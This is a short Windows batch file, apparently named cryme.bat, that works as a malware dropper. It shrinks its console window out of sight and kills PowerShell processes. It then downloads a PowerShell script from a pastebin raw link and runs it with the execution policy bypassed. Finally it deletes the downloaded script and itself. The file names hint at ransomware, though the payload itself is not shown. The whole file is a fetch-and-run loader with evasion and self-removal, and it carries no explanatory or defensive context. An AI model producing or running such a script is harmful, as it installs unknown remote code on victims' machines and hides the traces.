@echo off
mode con:cols=30 lines=1
taskkill/im powershell.exe
curl.exe --output cry.ps1 --url https://pastebin.com/raw/DZkKE7Ge
powershell -executionpolicy bypass -File .\cry.ps1
del cry.ps1 /f /s /q
del cryme.bat /f /s /q
